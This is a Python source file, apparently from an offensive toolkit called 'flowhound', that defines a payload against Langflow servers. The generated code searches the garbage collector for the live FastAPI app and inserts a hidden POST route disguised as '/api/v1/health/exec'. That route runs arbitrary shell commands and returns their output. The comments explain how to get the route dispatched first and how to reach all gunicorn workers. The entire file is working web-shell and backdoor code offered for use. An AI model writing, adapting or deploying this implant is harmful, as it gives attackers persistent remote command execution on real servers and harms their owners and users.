from flowhound.vulnerabilities.payloads.base_payload_class import PayloadBaseClass

# Endpoint path injected onto the victim's FastAPI app.
BIND_LANGFLOW_HTTP_ROUTE = "/api/v1/health/exec"


class Payload(PayloadBaseClass):
    blocking = False  # returns immediately; no accept() blocking

    def __init__(self, rhost: str, rport: int):
        # rhost:rport is the victim's reachable address used by the attacker to
        # probe and send commands.  The payload piggybacks on the existing port
        # (e.g. 7860) — rport must match the port Langflow is already serving on.
        self.rhost = rhost
        self.rport = rport
        self.payload = self.generate_payload()

    def generate_payload(self) -> str:
        # Walk the garbage collector to find the FastAPI instance serving the
        # application, then inject a POST route onto its router.
        #
        # ── App detection ────────────────────────────────────────────────────
        # FastAPI >=0.137 stores sub-routers as _IncludedRouter wrappers; each
        # wrapper's original_router.routes only has paths relative to that
        # sub-router's own prefix (e.g. '/v1/validate/code', not the full
        # '/api/v1/validate/code').  The include_context.prefix field carries
        # the accumulated path prefix.  _has_api_v1 therefore recurses through
        # include_context.prefix to reconstruct full paths — the same technique
        # used by Langflow's own plugin_routes.py.
        # On FastAPI <0.137 (Langflow 1.8.4 ships >=0.135.0) include_router
        # copies APIRoute objects with full paths directly onto app.router, so
        # the same _walk falls through to the flat-path check harmlessly.
        #
        # ── Route insertion position ──────────────────────────────────────────
        # Insert at index 0 so our APIRoute is evaluated first — before any
        # _IncludedRouter wrappers that share a path prefix and would return
        # Match.PARTIAL (triggering a 405 Method Not Allowed) when they come
        # first in the dispatch list.
        #
        # ── Multi-worker note ─────────────────────────────────────────────────
        # This code runs in one gunicorn worker process. The route is registered
        # in that worker's in-memory router only. _probe_bind_langflow_http in
        # command.py compensates by retrying up to _BIND_HTTP_PROBE_ATTEMPTS
        # times to cycle through all workers.
        return (
            "import gc, subprocess\n"
            "from fastapi import Request\n"
            "from fastapi.routing import APIRoute\n"
            "from fastapi.responses import JSONResponse\n"
            # ── _has_api_v1: works on both flat (fastapi <0.137) and
            # _IncludedRouter-based (>=0.137) route structures. ──────────────
            "def _has_api_v1(fa):\n"
            "    def _walk(routes, prefix=''):\n"
            "        for _r in routes:\n"
            "            _orig = getattr(_r, 'original_router', None)\n"
            "            if _orig is not None:\n"
            "                _ic = getattr(_r, 'include_context', None)\n"
            "                _cp = prefix + (getattr(_ic, 'prefix', '') or '')\n"
            "                if _walk(_orig.routes, _cp):\n"
            "                    return True\n"
            "            else:\n"
            "                if (prefix + getattr(_r, 'path', '')).startswith('/api/v1/'):\n"
            "                    return True\n"
            "        return False\n"
            "    return _walk(getattr(getattr(fa, 'router', None), 'routes', []))\n"
            "_candidates = [\n"
            "    o for o in gc.get_objects()\n"
            "    if type(o).__name__ == 'FastAPI' and _has_api_v1(o)\n"
            "]\n"
            "_app = max(_candidates, key=lambda o: len(getattr(getattr(o, 'router', None), 'routes', [])), default=None)\n"
            "if _app is not None:\n"
            f"    _route_path = {BIND_LANGFLOW_HTTP_ROUTE!r}\n"
            # Evict any stale registration at the same path, then insert at
            # index 0 so our APIRoute is evaluated first — before any
            # _IncludedRouter wrappers that share a path prefix and would
            # return Match.PARTIAL (triggering a 405) when they come first.
            "    _app.router.routes = [\n"
            "        _r for _r in _app.router.routes\n"
            "        if getattr(_r, 'path', '') != _route_path\n"
            "    ]\n"
            "    async def _exec(req: Request):\n"
            "        _body = await req.json()\n"
            "        _cmd = _body.get('cmd', 'id')\n"
            "        _proc = subprocess.run(\n"
            "            _cmd, shell=True, stdout=subprocess.PIPE,\n"
            "            stderr=subprocess.STDOUT,\n"
            "        )\n"
            "        return JSONResponse({\n"
            "            'output': _proc.stdout.decode(errors='replace'),\n"
            "            'returncode': _proc.returncode,\n"
            "        })\n"
            "    _app.router.routes.insert(0, APIRoute(_route_path, _exec, methods=['POST']))\n"
            "    _app.openapi_schema = None\n"
            "    _out = 'bind_langflow_http route registered'\n"
            "else:\n"
            "    _out = 'bind_langflow_http app not found'\n"
        )

    def load_payload(self) -> str:
        return self.payload
